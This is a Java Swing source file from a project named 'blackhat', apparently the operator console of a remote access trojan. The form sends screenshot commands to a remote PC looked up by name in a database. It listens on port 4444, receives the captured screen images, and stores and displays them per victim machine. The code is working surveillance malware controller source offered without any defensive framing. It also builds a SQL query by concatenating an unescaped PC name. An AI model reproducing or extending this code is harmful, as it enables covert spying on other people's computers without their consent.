/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Window;

import Connection.Command;
import Database.Client;
import Database.Conf;
import blackhat.Tooles;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.imageio.ImageIO;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.filechooser.FileNameExtensionFilter;

/**
 *
 * @author abaza
 */
public class frmScreenShot extends javax.swing.JInternalFrame {

    private Tooles BHTooles = null;
    private MainGUI MainClass = null;
    private Thread ResevedImage = null;
    private boolean Reseving = true;
    private String IP_Address = null, PC_Name = "", dirName = "", ImageName = "";
    private static int Index = 0;
    private File Dir = null;
    private MouseListener MouseListenerScreenShot = null;

    /**
     * Creates new form frmScreenShot
     *
     * @param MainClass
     * @param PC_Name
     */
    public frmScreenShot(MainGUI MainClass, String PC_Name) {
        initComponents();
        this.MainClass = MainClass;
        this.PC_Name = PC_Name;
        BHTooles = new Tooles();

        MouseListenerScreenShot = new MouseListener() {
            @Override
            public void mouseClicked(MouseEvent me) {
                jTextField1.setText(((JLabel) me.getSource()).getName());
                jButton1.setEnabled(true);
                jButton2.setEnabled(true);
                jButton3.setEnabled(true);
            }

            @Override
            public void mousePressed(MouseEvent me) {
//                throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
            }

            @Override
            public void mouseReleased(MouseEvent me) {
//                throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
            }

            @Override
            public void mouseEntered(MouseEvent me) {
                jTextField1.setText("");
                jButton1.setEnabled(false);
                jButton2.setEnabled(false);
                jButton3.setEnabled(false);
            }

            @Override
            public void mouseExited(MouseEvent me) {
                if (jTextField1.getText().isEmpty()) {
                    jTextField1.setText("");
                    jButton1.setEnabled(false);
                    jButton2.setEnabled(false);
                    jButton3.setEnabled(false);
                }
            }
        };
        try {
            String Q = "WHERE " + Client.FLD_PC_NAME + "='" + PC_Name + "'";
            Client Computers = Client.queryFirstRow(blackhat.BlackHat.ConnectDB, Q);
            if (Computers != null) {
                IP_Address = Computers.getPc_ip_address().toString().trim();
            }
            Conf dbconf = Conf.queryFirstRow(blackhat.BlackHat.ConnectDB, "");
            if (dbconf != null) {
                dirName = (dbconf.getDownload_dir().toString().isEmpty() ? "" : dbconf.getDownload_dir().toString()) + File.separator + PC_Name;

                int OptionName = Integer.parseInt((dbconf.getDownloadname() == null) ? "0" : dbconf.getDownloadname().toString());
                switch (OptionName) {
                    case 0:
                        String date = new SimpleDateFormat("dd-MM-yyyy").format(new Date());
                        //Date and PC_Name
                        ImageName = date + "_" + PC_Name + ":";
                        break;
                    case 1:
                        //PC_Name only
                        ImageName = PC_Name + ":";
                        break;

                }
            }
        } catch (SQLException ex) {
        }

        if (!Command.KEY_SCREEN_SHUT) {
            ResevedImage = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Reseved();
                    } catch (IOException ex) {
                    }
                }
            });
            if (!Command.KEY_RESEVED_FLAG_SCREEN_SHUT) {
                this.MainClass.Connect(Command.RESEVED_FLAG_SCREEN_SHUT);
            } else {
                try {
                    this.MainClass.Connect(Command.STOP_RESEVED_FLAG_SCREEN_SHUT);
                    Thread.sleep(1000);
                    this.MainClass.Connect(Command.RESEVED_FLAG_SCREEN_SHUT);
                } catch (InterruptedException ex) {
                }
            }
            if (!Command.KEY_SCREEN_SHUT) {
                this.MainClass.Connect(Command.SCREEN_SHUT);
            } else {
                try {
                    this.MainClass.Connect(Command.STOP_SCREEN_SHUT);
                    Thread.sleep(1000);
                    this.MainClass.Connect(Command.SCREEN_SHUT);
                } catch (InterruptedException ex) {
                }
            }

            Reseving = true;
            ResevedImage.setPriority(4);
            ResevedImage.start();
            PlayandPuse.setSelected(true);
            ledGreen.setLedOn(true);
            ledRed.setLedOn(false);

        } else {
            ResevedImage = null;
            this.MainClass.Connect(Command.STOP_SCREEN_SHUT);
            Reseving = false;
            ResevedImage = null;
            PlayandPuse.setSelected(false);
            ledGreen.setLedOn(false);
            ledRed.setLedOn(true);
            this.MainClass.ScreenShot();
        }
    }

    private synchronized void Reseved() throws IOException {
        try (ServerSocket serversocket = new ServerSocket(4444)) {
            while (Reseving) {
                Socket socket = serversocket.accept();
                byte[] message = null;
                DataInputStream dIn = new DataInputStream(socket.getInputStream());

                int length = dIn.readInt();                    // read length of incoming message
                if (length > 0) {
                    message = new byte[length];
                    dIn.readFully(message, 0, message.length); // read the message
                }

                if ((message != null) && (message.length > 0)) {
                    if (blackhat.BlackHat.Debug) {
                        System.err.println("Reseved Image Length : " + length);
                    }
                    Dir = new File(dirName);
                    if (Dir.exists()) {
                        Dir.setWritable(true);
                        Dir.setExecutable(true);
                        Dir.setReadable(true);
                    } else if (Dir.mkdirs()) {
                        Dir.setWritable(true);
                        Dir.setExecutable(true);
                        Dir.setReadable(true);
                    }
                    BufferedImage imag = ImageIO.read(new ByteArrayInputStream(message));
                    File Image = new File(Dir.getPath() + File.separator + ImageName + Index++ + ".jpg");
                    ImageIO.write(imag, "jpg", Image);
                    CreateImage(MainPanelBord, Image.getPath());
                    pack();
                }
            }
        }

    }

    private void CreateImage(JPanel Main, String ImagePath) {
        JPanel jPanel = new JPanel();
        JLabel Image = new JLabel();

        jPanel.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));
        jPanel.setPreferredSize(new java.awt.Dimension(200, 200));
        jPanel.setLayout(new java.awt.CardLayout());
        BHTooles.ShowImage(ImagePath, Image, 200, 200);
        Image.setName(ImagePath);
        Image.addMouseListener(MouseListenerScreenShot);

        jPanel.add(Image);
        Main.add(jPanel);
        pack();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        MainPanelBord = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jTextField1 = new javax.swing.JTextField();
        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();
        PlayandPuse = new javax.swing.JToggleButton();
        ledGreen = new eu.hansolo.steelseries.extras.Led();
        ledRed = new eu.hansolo.steelseries.extras.Led();
        jButton3 = new javax.swing.JButton();
        jButton4 = new javax.swing.JButton();

        setClosable(true);
        setIconifiable(true);
        setMinimumSize(new java.awt.Dimension(1040, 664));
        addInternalFrameListener(new javax.swing.event.InternalFrameListener() {
            public void internalFrameOpened(javax.swing.event.InternalFrameEvent evt) {
                formInternalFrameOpened(evt);
            }
            public void internalFrameClosing(javax.swing.event.InternalFrameEvent evt) {
                formInternalFrameClosing(evt);
            }
            public void internalFrameClosed(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameIconified(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameDeiconified(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameActivated(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameDeactivated(javax.swing.event.InternalFrameEvent evt) {
            }
        });
        addComponentListener(new java.awt.event.ComponentAdapter() {
            public void componentResized(java.awt.event.ComponentEvent evt) {
                formComponentResized(evt);
            }
        });
        addHierarchyBoundsListener(new java.awt.event.HierarchyBoundsListener() {
            public void ancestorMoved(java.awt.event.HierarchyEvent evt) {
            }
            public void ancestorResized(java.awt.event.HierarchyEvent evt) {
                formAncestorResized(evt);
            }
        });

        MainPanelBord.setBackground(new java.awt.Color(1, 1, 1));
        MainPanelBord.setAutoscrolls(true);
        MainPanelBord.setMinimumSize(new java.awt.Dimension(1030, 630));
        jScrollPane1.setViewportView(MainPanelBord);

        jLabel1.setText(blackhat.BlackHat.local.getString("lblImagePath"));

        jButton1.setText(blackhat.BlackHat.local.getString("btnCopy"));
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jButton2.setText(blackhat.BlackHat.local.getString("btnMoveTo"));
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        PlayandPuse.setText("Play");
        PlayandPuse.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                PlayandPuseActionPerformed(evt);
            }
        });

        ledGreen.setLedColor(eu.hansolo.steelseries.tools.LedColor.GREEN_LED);

        jButton3.setText(blackhat.BlackHat.local.getString("btnShowImage"));
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });

        jButton4.setText("Clear");
        jButton4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton4ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addComponent(jLabel1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, 618, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton3, javax.swing.GroupLayout.PREFERRED_SIZE, 102, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 106, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE))
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(ledGreen, javax.swing.GroupLayout.PREFERRED_SIZE, 36, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(ledRed, javax.swing.GroupLayout.PREFERRED_SIZE, 36, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(PlayandPuse, javax.swing.GroupLayout.PREFERRED_SIZE, 827, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 1041, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(0, 0, Short.MAX_VALUE))
        );

        layout.linkSize(javax.swing.SwingConstants.HORIZONTAL, new java.awt.Component[] {ledGreen, ledRed});

        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 264, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(ledGreen, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(ledRed, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(PlayandPuse)
                        .addComponent(jButton4)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 9, Short.MAX_VALUE)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton1)
                    .addComponent(jButton2)
                    .addComponent(jButton3)))
        );

        layout.linkSize(javax.swing.SwingConstants.VERTICAL, new java.awt.Component[] {ledGreen, ledRed});

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formInternalFrameClosing(javax.swing.event.InternalFrameEvent evt) {//GEN-FIRST:event_formInternalFrameClosing
        this.MainClass.Connect(Command.STOP_RESEVED_FLAG_SCREEN_SHUT);
        this.MainClass.Connect(Command.STOP_SCREEN_SHUT);
        Reseving = false;
        ResevedImage = null;
    }//GEN-LAST:event_formInternalFrameClosing

    private void formAncestorResized(java.awt.event.HierarchyEvent evt) {//GEN-FIRST:event_formAncestorResized
    }//GEN-LAST:event_formAncestorResized

    private void formComponentResized(java.awt.event.ComponentEvent evt) {//GEN-FIRST:event_formComponentResized
    }//GEN-LAST:event_formComponentResized

    private void formInternalFrameOpened(javax.swing.event.InternalFrameEvent evt) {//GEN-FIRST:event_formInternalFrameOpened
    }//GEN-LAST:event_formInternalFrameOpened

    private void PlayandPuseActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_PlayandPuseActionPerformed
        if (PlayandPuse.isSelected()) {
            this.MainClass.Connect(Command.RESEVED_FLAG_SCREEN_SHUT);
            Reseving = true;
            ResevedImage.resume();
            ledGreen.setLedOn(true);
            ledRed.setLedOn(false);
            PlayandPuse.setText(blackhat.BlackHat.local.getString("btnPuse"));
        } else {
            this.MainClass.Connect(Command.STOP_RESEVED_FLAG_SCREEN_SHUT);
            ResevedImage.suspend();
            Reseving = false;
            ledGreen.setLedOn(false);
            ledRed.setLedOn(true);
            PlayandPuse.setText(blackhat.BlackHat.local.getString("btnPlay"));
        }
    }//GEN-LAST:event_PlayandPuseActionPerformed
    public void RemoveThis(int Number) {
        MainPanelBord.getComponent(Number).setVisible(false);
    }
    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.addChoosableFileFilter(new FileNameExtensionFilter("Image Files", "jpg"));
        fileChooser.setDialogTitle(blackhat.BlackHat.local.getString("lblSaveOpenBox"));

        fileChooser.setSelectedFile(new File("Image_" + this.PC_Name + "_" + jTextField1.getText().split(":")[1]));

        int userSelection = fileChooser.showSaveDialog(this);

        if (userSelection == JFileChooser.APPROVE_OPTION) {
            try {
                File fileToSave = fileChooser.getSelectedFile();
                File ImageCopy = new File(jTextField1.getText());
                BHTooles.copyFile(ImageCopy, fileToSave.getAbsoluteFile());
                ImageCopy.delete();

                String ImageNametmp = jTextField1.getText().substring(0, jTextField1.getText().length() - 4);
                String[] tmp = ImageNametmp.split(":");
                int Number = Integer.parseInt(tmp[1]);
                RemoveThis(Number);
            } catch (IOException ex) {
            }
        }
    }//GEN-LAST:event_jButton2ActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.addChoosableFileFilter(new FileNameExtensionFilter("Image Files", "jpg"));
        fileChooser.setDialogTitle(blackhat.BlackHat.local.getString("lblSaveOpenBox"));
        fileChooser.setSelectedFile(new File("Image_" + this.PC_Name + "_" + jTextField1.getText().split(":")[1]));
        int userSelection = fileChooser.showSaveDialog(this);

        if (userSelection == JFileChooser.APPROVE_OPTION) {
            try {
                File fileToSave = fileChooser.getSelectedFile();
                File ImageCopy = new File(jTextField1.getText());
                BHTooles.copyFile(ImageCopy, fileToSave.getAbsoluteFile());
            } catch (IOException ex) {
            }
        }
    }//GEN-LAST:event_jButton1ActionPerformed

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
        this.MainClass.ShowImage(jTextField1.getText(), this);
    }//GEN-LAST:event_jButton3ActionPerformed

    private void jButton4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton4ActionPerformed
        int Count = MainPanelBord.getComponentCount();
        for (int i = 0; i <= Count - 1; i++) {
            MainPanelBord.remove(i);
            Count = MainPanelBord.getComponentCount();
        }
        MainPanelBord.removeAll();
        MainPanelBord.updateUI();
        pack();
    }//GEN-LAST:event_jButton4ActionPerformed


    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JPanel MainPanelBord;
    private javax.swing.JToggleButton PlayandPuse;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JButton jButton3;
    private javax.swing.JButton jButton4;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextField jTextField1;
    private eu.hansolo.steelseries.extras.Led ledGreen;
    private eu.hansolo.steelseries.extras.Led ledRed;
    // End of variables declaration//GEN-END:variables
}
